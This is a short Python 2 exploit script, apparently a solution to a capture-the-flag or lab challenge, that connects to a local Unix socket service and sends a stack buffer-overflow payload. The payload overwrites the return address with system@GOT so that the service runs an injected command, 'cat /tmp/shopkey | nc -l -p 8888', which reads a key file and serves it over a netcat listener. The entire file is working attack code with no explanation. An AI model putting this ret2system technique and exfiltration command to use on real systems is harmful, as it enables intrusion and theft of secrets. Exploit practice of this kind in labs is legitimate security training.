#!/usr/bin/env python
#encoding:utf-8

import socket

def NOPS(n):
    return ' ' * n

def RIGHT_PAD(s, n):
    return s + NOPS(n - len(s))

def l32(x):
    return ''.join([chr((x >> (i << 3)) & 0xff) for i in xrange(4)])

BINSH_ADDR = 0x0804B0A0
SYSTEM_GOT = 0x08048670
SOCK_PATH = '/home/wangyanfeng/shopinfo/si-socket'

io = socket.socket(socket.AF_UNIX)
io.connect(SOCK_PATH)

payload = RIGHT_PAD('\xff' * 20 + '\ncat /tmp/shopkey | nc -l -p 8888;\n', 0x4c + 4) + l32(SYSTEM_GOT) + NOPS(4) + l32(BINSH_ADDR)
io.sendall(l32(len(payload)))
io.sendall(payload)
